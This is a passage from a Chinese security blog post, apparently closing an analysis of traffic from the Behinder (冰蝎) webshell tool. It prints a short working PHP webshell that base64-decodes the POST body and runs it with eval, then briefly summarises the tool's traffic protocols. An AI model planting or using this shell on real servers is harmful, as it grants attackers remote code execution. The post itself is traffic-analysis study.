+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$prefix</span> = <span class="string">&quot;pass=&quot;</span>;<span class="comment">// 去掉开头的&quot;pass=&quot;前缀</span></span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$data</span>, <span class="variable">$prefix</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$data</span> = substr(<span class="variable">$data</span>, strlen(<span class="variable">$prefix</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_decode(<span class="variable">$data</span>);<span class="comment">// Base64解码并返回结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$post</span>=Decrypt(file_get_contents(<span class="string">&quot;php://input&quot;</span>));</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$post</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>冰蝎的自带的协议的流量分析看协议配置模块就行了，冰蝎不能随便加混淆流量，自带的哪几个流量协议没有分割符配置，冰蝎更像一个制作流量混淆木马的平台</p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/file/"># file</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/01/04/android/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/">小程序安全简单学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
